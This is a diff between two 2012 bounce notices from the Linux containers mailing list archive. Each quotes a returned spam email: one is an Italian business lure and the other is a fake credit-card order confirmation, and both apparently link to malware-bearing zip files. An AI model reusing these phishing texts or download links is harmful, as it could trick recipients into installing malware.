@@ -1,11 +1,9 @@
-From: Postmaster-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org
-Subject: DELIVERY FAILURE: User patrizia.donofrio
-	(patrizia.donofrio-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org) not
-	listed in Domino Directory
-Date: Tue, 21 Feb 2012 22:32:26 -0800
-Message-ID: <OFDF4F713C.E55A3B84-ONC12579AC.0023EDC0-C12579AC.0023EDC4@consiglioregionale.piemonte.it>
+From: MAILER-DAEMON-i9wRM+HIrmnmtl4Z8vJ8Kg761KYD1DLY@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Wed, 22 Feb 2012 03:19:06 -0500 (EST)
+Message-ID: <20120222081906.3372E3B0765@smtp37.relay.iad1a.emailsrvr.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============4200613321190843989=="
+Content-Type: multipart/mixed; boundary="===============0807933970750810572=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -16,89 +14,98 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: confirming <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
---===============4200613321190843989==
-Content-Type: multipart/report; report-type=delivery-status; boundary="==IFJRGLKFGIR7982222UHRUHIHD"
+This is a MIME-encapsulated message.
 
---==IFJRGLKFGIR7982222UHRUHIHD
-Content-Type: text/plain; charset=ISO-8859-1
-Content-Transfer-Encoding: quoted-printable
+--===============0807933970750810572==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com"
+Content-Transfer-Encoding: 7bit
 
-Your message
+This is a MIME-encapsulated message.
 
-  Subject: Re[2]: Not=E0!
+--50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
 
-was not delivered to:
+This is the mail system at host smtp37.relay.iad1a.emailsrvr.com.
 
-  patrizia.donofrio-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
 
-because:
+For further assistance, please send mail to postmaster.
 
-  User patrizia.donofrio (patrizia.donofrio-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org)=
- not listed in Domino Directory
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
 
+                   The mail system
 
---==IFJRGLKFGIR7982222UHRUHIHD
+<xslk-7mSxt9ZvYHA@public.gmane.org>: host mail1.tinet.ie[159.134.198.135] said: 550 5.1.1 User
+    <xslk-7mSxt9ZvYHA@public.gmane.org> unknown (in reply to RCPT TO command)
+
+--50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com
+Content-Description: Delivery report
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns;lncsr.consiglioregionale.piemonte.it
+Reporting-MTA: dns; smtp37.relay.iad1a.emailsrvr.com
+X-SMTP-Server-Queue-ID: 50DCE3B0249
+X-SMTP-Server-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Wed, 22 Feb 2012 03:19:00 -0500 (EST)
 
-Original-Recipient: rfc822;patrizia.donofrio-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org
-Final-Recipient: rfc822;patrizia.donofrio-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org
+Final-Recipient: rfc822; xslk-7mSxt9ZvYHA@public.gmane.org
+Original-Recipient: rfc822;xslk-7mSxt9ZvYHA@public.gmane.org
 Action: failed
 Status: 5.1.1
-Diagnostic-Code: X-Notes; User patrizia.donofrio (patrizia.donofrio@co
- nsiglioregionale.piemonte.it) not listed in Domino Directory
+Remote-MTA: dns; mail1.tinet.ie
+Diagnostic-Code: smtp; 550 5.1.1 User <xslk-7mSxt9ZvYHA@public.gmane.org> unknown
 
---==IFJRGLKFGIR7982222UHRUHIHD
+--50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com
+Content-Description: Undelivered Message
 Content-Type: message/rfc822
+Content-Transfer-Encoding: 7bit
 
-Received: from 02asdec.csi.it ([10.102.116.68])
-          by lncsr.consiglioregionale.piemonte.it (Lotus Domino Release 8.5.3)
-          with ESMTP id 2012022207322624-82017 ;
-          Wed, 22 Feb 2012 07:32:26 +0100
-Received: from cpanel50.swiftco.net (cpanel50.swiftco.net [216.18.227.242])
-	by 02asdec.csi.it (Postfix) with ESMTP id 7D3F884700
-	for <patrizia.donofrio-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org>; Wed, 22 Feb 2012 07:32:30 +0100 (CET)
-Received: from [216.18.227.242] by cpanel50.swiftco.net id uIVrT4CzKj2J8x3; Tue, 21 Feb 2012 22:32:26 -0800
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by smtp37.relay.iad1a.emailsrvr.com (SMTP Server) with ESMTP id 50DCE3B0249
+	for <xslk-7mSxt9ZvYHA@public.gmane.org>; Wed, 22 Feb 2012 03:19:00 -0500 (EST)
+X-Virus-Scanned: OK
+Received: by smtp37.relay.iad1a.emailsrvr.com (Authenticated sender: chris-AT-fleetfeetgaithersburg.com) with ESMTPA id 1C50A3B04AA
+	for <xslk-7mSxt9ZvYHA@public.gmane.org>; Wed, 22 Feb 2012 03:18:59 -0500 (EST)
+Received: from [174.143.182.212] by blog.nomalistdesign.com id uIU9ES8OG1Ho with SMTP; Wed, 22 Feb 2012 08:18:59 +0000
+Date: Wed, 22 Feb 2012 08:18:59 +0000
 From: "confirming" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <patrizia.donofrio-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org>
-Subject: Re[2]: Notà!
-Date: Tue, 21 Feb 2012 22:32:26 -0800
+X-Mailer: The Bat! (v3.02.8) Personal
+X-Priority: 3 (Normal)
+Message-ID: <7752260513.99424649782810-oYFICFIz4VW5PHSWFFpsopOMunqAqVKM@public.gmane.org>
+To: <xslk-7mSxt9ZvYHA@public.gmane.org>
+Subject: You have chosen to pay by credit card.
 MIME-Version: 1.0
-X-Virus-Scanned: clamav-milter 0.97 at vm-02asdec
-X-Virus-Status: Clean
-X-MIMETrack: Itemize by SMTP Server on CSREGPIE1/CSREGPIE/IT(Release 8.5.3|September 15, 2011) at
- 2012/02/22 07:32:26 AM,
-	Serialize by Router on CSREGPIE1/CSREGPIE/IT(Release 8.5.3|September 15, 2011) at
- 2012/02/22 07:32:26 AM
-X-TNEFEvaluated: 1
-Message-ID: <OFDF4F713C.E55A3B84-ONC12579AC.0023EDC0-C12579AC.0023EDC4-PDAo0+Cvcgqs2ELsRrW9x2RVk/6I3J1Hp9KI5E10wRM@public.gmane.org>
 Content-Type: text/plain;
 	charset="windows-1252"
 Content-Transfer-Encoding: quoted-printable
 
 
 
-Gentile utente, Monte Biz =20
-       =20
+
+Dear customer.
+
+Your order has been accepted. Your order reference is 812687.=20
+
+Terms of delivery and the date can be found with=20
+the auto-generated msword file located at:
+http://www.vinideltrentino.com/ie/invoice.zip?iduser=3Dxslk-7mSxt9ZvYHA@public.gmane.org?4866=
+12
+
+=3D=3D
+Best regards, Tel. / Fax.:  (775) 251 70 775.
 
 
-La tua richiesta di riesame e la possibile estensione della vostra azienda.
 
-Stato studiato.
-Sulla base della richiesta, si fa riferimento alle proposte e raccomandazio=
-ni.
-http://www.studiomancinelli.it/adviser/Dettagli.zip?4710004697182
+--50DCE3B0249.1329898746/smtp37.relay.iad1a.emailsrvr.com--
 
-
-=
-
---==IFJRGLKFGIR7982222UHRUHIHD--
-
---===============4200613321190843989==
+--===============0807933970750810572==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -108,4 +115,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============4200613321190843989==--
+--===============0807933970750810572==--
